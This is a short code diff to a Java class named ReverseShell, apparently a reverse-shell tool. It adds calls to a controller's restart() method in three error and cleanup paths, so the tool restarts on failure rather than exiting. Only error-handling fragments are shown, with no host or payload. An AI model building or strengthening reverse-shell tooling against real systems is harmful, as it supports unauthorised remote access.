@@ -36,6 +36,7 @@ public class ReverseShell {
      } else {
          detected   = false;
          System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
+         controller.Controller.restart();
      }
      return detected;
  }
@@ -70,6 +71,7 @@ public class ReverseShell {
      } catch (SocketTimeoutException ex) {} catch (IOException ex) {
          this.error = true;
          System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n\n", iname, oname));
+         controller.Controller.restart();
      }
  }
  
@@ -121,6 +123,7 @@ public class ReverseShell {
              if (client != null) { try { client.close(); } catch (IOException ex) {} }
              
              if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
+             controller.Controller.restart();
          }
      }
  }
